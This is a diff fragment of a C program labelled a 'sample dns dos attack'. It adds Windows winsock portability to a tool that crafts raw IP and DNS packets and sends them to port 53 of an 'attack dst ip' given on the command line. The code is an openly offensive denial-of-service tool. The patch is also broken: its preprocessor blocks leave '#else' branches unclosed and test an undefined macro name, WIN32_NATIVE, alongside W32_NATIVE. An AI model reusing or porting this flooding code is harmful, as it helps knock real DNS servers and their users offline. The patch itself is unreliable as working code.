@@ -13,6 +13,23 @@ sample dns dos attack
 #include<netinet/ip.h>
 #include<netdb.h>
 #include<arpa/inet.h>
+
+
+/* Define to 1 if the native W32 API should be used. */
+#if (defined _WIN32 || defined __WIN32__) && !defined __CYGWIN__
+#define W32_NATIVE 1
+#endif
+#ifdef W32_NATIVE
+#define WIN32_LEAN_AND_MEAN
+#define _WIN32_WINNT 0x0502
+#include <windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#pragma comment(lib, "ws2_32.lib")
+#else
+
+
+
 struct ipheader					 //ip header
 {
 	unsigned char ip_hl:4,ip_v:4;//
@@ -63,6 +80,12 @@ int main(int argc,char **argv)
 	struct sockaddr_in my_addr;
 	struct dns_msg dns_data;//send bag
 	srand(time(NULL));
+   
+        #ifdef W32_NATIVE
+        WSADATA W;
+        SOCKET sockfd;
+        WSAStartup (0x101, &W);
+        #else
 	if(argc!=2)
 	{
 		printf("agrc!=2 agrc =attack dst ip \n");
@@ -78,6 +101,11 @@ int main(int argc,char **argv)
 		printf("setsockopt err");
 		exit(0);
 	}
+   
+        #ifdef WIN32_NATIVE
+        WSADATA WSAData;
+        WSAStartup(MAKEWORD(2, 2), &WSAData);
+        #endif
 	my_addr.sin_addr.s_addr=inet_addr(argv[1]); //
 	my_addr.sin_family=AF_INET;
 	my_addr.sin_port=htons(53);
